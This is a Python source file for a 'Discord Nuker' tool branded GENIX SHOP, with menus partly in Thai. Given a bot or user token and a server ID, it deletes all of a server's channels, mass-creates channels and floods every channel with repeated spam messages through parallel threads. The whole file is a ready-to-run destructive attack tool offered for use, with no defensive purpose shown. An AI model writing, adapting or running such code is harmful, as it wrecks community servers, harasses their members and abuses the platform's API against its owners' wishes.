import requests
import threading
import os,sys,time
import json
os.system("clear")

def delete_bot():
	os.system("clear")
	print("     CREATE BY GENIX SHOP | DISCORD NUKER [BOT]")
	print()
	token = input(" TOKEN BOT : ")
	serverID = input(" SERVER ID : ")
	print()
	input("Press enter to start...")
	print()
	
	data = requests.get(f"https://discord.com/api/v10/guilds/{serverID}/channels",headers={"authorization": f"Bot {token}"})
	for channel in json.loads(data.text):
		def API_DELETE(tokens):
			headers = {
				"authorization": f"Bot {tokens}"
			}
			req = requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}",headers=headers)
			print(f"  [-] Deleted Channels {req.json()['id']}")
		
		threading.Thread(target=API_DELETE, args=[token]).start()
	
def create_bot():
	os.system("clear")
	print("     CREATE BY GENIX SHOP | DISCORD NUKER [BOT]")
	print()
	token = input(" TOKEN BOT : ")
	serverID = input(" SERVER ID : ")
	body = input(" Channel Name : ")
	jam = int(input(" Number Of Create : "))
	print()
	input("Press enter to start...")
	print()
	
	def API_CREATE(tokens):
		headers = {
			"authorization": f"Bot {tokens}"
		}
		req = requests.post(f"https://discord.com/api/v10/guilds/{serverID}/channels",headers=headers,json={"type":0,"name":body,"permission_overwrites":[]})
		print("  [+] Create Channel Success")
	
	for _ in range(jam):
		threading.Thread(target=API_CREATE, args=[token]).start()
	
def fun3():
    os.system('clear')
    print("     CREATE BY GENIX SHOP | DISCORD NUKER [BOT]")
    print()
    token = input(' TOKEN BOT : ')
    guild = input(" Server ID : ")
    msg = input(' Message: ')
    jam = int(input(" Number of attack : "))
    print()
    for _ in range(jam):
        r = requests.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"})
        for channel in json.loads(r.text):
            def api(tokens):
                s = requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages",headers={"authorization": f"Bot {tokens}"},json={"content":f"{msg}"})
                print(f"  [+] Send MessageChannels Successfully")
            threading.Thread(target=api, args=[token]).start()
############## BOT ##############

def delete_user():
	os.system("clear")
	print("     CREATE BY GENIX SHOP | DISCORD NUKER [USER]")
	print()
	token = input(" TOKEN BOT : ")
	serverID = input(" SERVER ID : ")
	print()
	input("Press enter to start...")
	print()
	
	data = requests.get(f"https://discord.com/api/v10/guilds/{serverID}/channels",headers={"authorization": f"{token}"})
	for channel in json.loads(data.text):
		def API_DELETE(tokens):
			headers = {
				"authorization": f"{tokens}"
			}
			req = requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}",headers=headers)
			print(f"  [-] Deleted Channels {req.json()['id']}")
			
		threading.Thread(target=API_DELETE, args=[token]).start()
	
def create_user():
	os.system("clear")
	print("     CREATE BY GENIX SHOP | DISCORD NUKER [USER]")
	print()
	token = input(" TOKEN BOT : ")
	serverID = input(" SERVER ID : ")
	body = input(" Channel Name : ")
	print()
	input("Press enter to start...")
	print()
	
	def API_CREATE(tokens):
		headers = {
			"authorization": f"{tokens}"
		}
		req = requests.post(f"https://discord.com/api/v10/guilds/{serverID}/channels",headers=headers,json={"type":0,"name":body,"permission_overwrites":[]})
		print("  [+] Create Channel Success")
	
	threading.Thread(target=API_CREATE, args=[token]).start()
	
def nuker_user():
	os.system("clear")
	print("     CREATE BY GENIX SHOP | DISCORD NUKER [USER]")
	print()
	token = input(" TOKEN BOT : ")
	serverID = input(" SERVER ID : ")
	body = input(" Message : ")
	count = int(input(" ATTACK COUNT : "))
	print()
	input("Press enter to start...")
	print()
	
	
	for _ in range(count):
		
		data = requests.get(f"https://discord.com/api/v10/guilds/{serverID}/channels",headers={"authorization": token})
		for channel in json.loads(data.text):
			def index(tokens):
				headers = {
					"authorization": f"{tokens}"
				}
				req = requests.post(f"https://discord.com/api/v10/channels/{channel['id']}/messages",headers=headers,json={"content":f"{body}"})
				print(f"  [+] SEND MESSAGE SUCCESS")
		
		threading.Thread(target=index, args=[token]).start()
			
############ USER ###############
def bot_spammer():
	os.system("clear")
	print("     CREATE BY GENIX SHOP | DISCORD NUKER [BOT]")
	print()
	print(" [#] Select the functions to spammer : ")
	print()
	print("   [1] Delete All Channels")
	print("   [2] Create Channels")
	print("   [3] Spam Nuker Message")
	print()
	mod = input("-> ")
	print()
	if (mod == "1" or mod == "01"):
		delete_bot()
	elif (mod == "2" or mod == "02"):
		create_bot()
	elif (mod == "3" or mod == "03"):
		fun3()
	else:
		print(f""" [!] ไม่พบฟังก์ชั่น '{mod}' ในระบบ""")
		time.sleep(2)
		bot_spammer()
		
def users_spammer():
	os.system("clear")
	print("     CREATE BY GENIX SHOP | DISCORD NUKER [USER]")
	print()
	print(" [#] Select the functions to spammer : ")
	print()
	print("   [1] Delete All Channels")
	print("   [2] Create Channels")
	print("   [3] Spam Nuker Message")
	print()
	mod = input("-> ")
	print()
	if (mod == "1" or mod == "01"):
		delete_user()
	elif (mod == "2" or mod == "02"):
		create_user()
	elif (mod == "3" or mod == "03"):
		nuker_user()
	else:
		print(f""" [!] ไม่พบฟังก์ชั่น '{mod}' ในระบบ""")
		time.sleep(2)
		users_spammer()

print("     CREATE BY GENIX SHOP | DISCORD NUKER V.2")
print()
print(" [#] กรุณาเลือกโหมดที่คุณต้องการจะยิง :")
print()
print("   [1] SPAM BY BOT")
print("   [2] SPAM BY USER")
print()
select = input("-> ")
print()
if (select == "1" or select == "01"):
	bot_spammer()
elif (select == "2" or select == "02"):
	users_spammer()
else:
	print(f"""   [!] ไม่พบฟังก์ชั่น '{select}' ในระบบ """)
	time.sleep(2)
	exit()
